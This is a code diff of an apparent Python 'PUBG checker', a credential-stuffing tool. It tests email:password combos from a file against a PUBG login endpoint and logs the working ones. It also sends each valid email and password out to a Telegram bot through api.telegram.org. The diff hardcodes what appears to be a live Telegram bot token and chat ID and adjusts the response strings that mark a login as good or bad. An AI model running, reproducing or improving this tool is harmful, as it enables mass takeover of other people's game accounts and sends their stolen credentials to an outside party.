@@ -12,17 +12,17 @@ print(f"""\x1b[32;1m
 
              _                  _               _             
             | |                | |             | |            
- _   _   _| |    _    _| |   _  _| | _ _  
+ _   _   _| |    _    _| |__   _  _| | _ _  
 | '_ \| | | | '_ \ / _` |  / | '_ \ / _ \/ | |/ / _ \  '|
-| |_) | |_| | |_) | (_| | | (| | | |  / (|   <  / |   
-| ./ \__,_|_./ \, |  \___|_| |_|\___|\___|_|\_\___|_|   
+| |_) | |_| | |_) | (_| | | (__| | | |  / (|   <  / |   
+| ./ \__,_|_.__/ \__, |  \___|_| |_|\___|\___|_|\_\___|_|   
 | |                 / |                                     
 |_|                |_/                                      
 
 \x1b[39;1mDiv ==> @X888E    CH ==> @E999G 
 """)
-ID = input("Enter Your ID: ")
-token = input("Enter Your Token: ")
+ID = '948449142'
+token = '1706448122:AAEauXhifuALNv74ChxogexxnTbFnFn541M'
 combos = open("acc.txt", "r").read().splitlines()
 for combo in combos:
     try:
@@ -61,13 +61,13 @@ for combo in combos:
         f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1=sig={token22}",
         data=data2, headers=headers2)
     d += 1
-    if "token" in r2.text:
+    if "An error occurred." in r2.text:
         print(f"\x1b[32;1m[{d}]\x1b[32;1m [good]\x1b[37;1m {user}:{passw} ")
         with open("PUBG_Available.txt", "a") as m:
             m.write(bruted_text)
             requests.get(
-                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𓆩Pubg Checker𓆪\n𝖷𝗑----------𝗑---------------𝗑---------𝗑𝖷\n• ࿈ ( Eamil : {user}\n• ࿈ ( Pass : {passw}\n𝖷𝗑-----------𝗑---------------𝗑-----------𝗑𝖷\nDiv ==> @X888E    CH ==> @E999G ✓')
-    elif '"msg":"Params Email is other format!"' in r2.text:
+                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=•Eamil : {user}\n•Pass : {passw}\n ')
+    elif '{"msg":"invalid sig", "ret":1008}' in r2.text:
         print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
     elif '"msg":"Params Email Format is Error!"' in r2.text:
         print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
